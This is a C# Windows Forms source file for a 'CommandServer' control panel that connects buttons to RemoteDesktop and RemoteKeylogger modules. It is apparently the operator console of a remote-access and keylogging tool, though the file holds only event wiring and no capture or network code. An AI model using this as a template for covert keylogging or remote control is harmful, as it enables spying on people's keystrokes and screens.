﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Net;

namespace CommandServer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            RemoteDesktop.initRemoteDesktop(textBox3, pictureBox1, toolStripStatusLabel1);
            RemoteKeylogger.initRemoteKeylogger(textBox4, button9, button10);
            Base.init(this, toolStripStatusLabel1, textBox1, textBox2);
            Base.startThreads();
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            Base.tb2_keydown(e);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Base.btn1_Click();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Base.btn2_Click();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Base.btn3_Click();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Base.btn4_Click();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn5_Click();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn6_Click();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn7_Click();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn8_Click();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            RemoteKeylogger.btn9_Click();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            RemoteKeylogger.btn10_Click();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Base.frm_closing();
        }
    }
}
